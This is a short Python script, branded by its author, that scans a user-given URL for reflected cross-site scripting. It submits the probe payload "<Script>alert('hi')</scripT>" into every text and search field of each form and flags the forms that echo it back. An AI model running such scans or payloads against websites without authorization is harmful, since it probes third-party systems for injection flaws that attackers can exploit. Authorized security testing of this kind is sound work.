import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import os
import time
from colorama import Fore,Back,Style
import socket
import requests
class bcolors:
    OK = '\033[92m' 
    a = '\033[93m' 
    FAIL = '\033[91m' 
    RESET = '\033[0m' 
    #TheSadError Repo
def get_all_forms(url):
    """Given a `url`, it returns all forms from the HTML content"""
    soup = bs(requests.get(url).content, "html.parser")
    return soup.find_all("form")

def get_form_details(form):
    """
    This function extracts all possible useful information about an HTML `form`
    """
    details = {}
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, value):
    """
    Submits a form given in `form_details`
    Params:
        form_details (list): a dictionary that contain form information
        url (str): the original URL that contain that form
        value (str): this will be replaced to all text and search inputs
    Returns the HTTP Response after form submission
    """
    target_url = urljoin(url, form_details["action"])
    inputs = form_details["inputs"]
    data = {}
    for input in inputs:
        if input["type"] == "text" or input["type"] == "search":
            input["value"] = value
        input_name = input.get("name")
        input_value = input.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        # GET request
        return requests.get(target_url, params=data)

def scan_xss(url):
    """
    Given a `url`, it prints all XSS vulnerable forms and 
    returns True if any is vulnerable, False otherwise
    """
    forms = get_all_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    js_script = "<Script>alert('hi')</scripT>"
    is_vulnerable = False
    for form in forms:
        form_details = get_form_details(form)
        content = submit_form(form_details, url, js_script).content.decode()
        if js_script in content:
            print(f"[+] XSS Detected on {url}")
            print(f"[*] Form details:")
            pprint(form_details)
            is_vulnerable = True
    return is_vulnerable


if __name__ == "__main__":
    os.system("clear")
    os.system("figlet Error | lolcat")
    print(f"{bcolors.FAIL}This Tool Created By Error")
    print(f"{bcolors.FAIL}Github  : https://github.com/TheSadError ")
    print(f"{bcolors.FAIL}Discord : err0r#4018")
    print(f"{bcolors.OK}[NIVOS] Welcome To XSS Scanner.")
    url = input(f"{bcolors.FAIL}[NIVOS] Please Input URL : ")
    print(scan_xss(url))
